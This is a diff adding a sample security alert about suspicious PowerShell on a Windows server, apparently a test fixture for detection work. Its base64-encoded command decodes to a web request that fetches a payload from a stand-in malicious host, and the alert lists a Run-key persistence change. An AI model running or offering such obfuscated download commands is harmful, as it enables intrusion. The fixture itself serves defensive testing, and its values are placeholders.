@@ -1,0 +1,13 @@
+Suspicious PowerShell execution detected on host WIN-SERVER-01.
+Command: powershell.exe -EncodedCommand <base64>
+User: DOMAIN\admin
+Time: 2024-11-25T14:30:00Z
+Source IP: 192.168.1.100
+Destination: external-server.com
+Event ID: 4688
+Process: powershell.exe
+Parent Process: cmd.exe
+Command Line: powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAcwA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAA=
+Network Activity: Outbound connection to 203.0.113.42:443
+File Hash: SHA256 a1b2c3d4e5f6...
+Registry Keys Modified: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
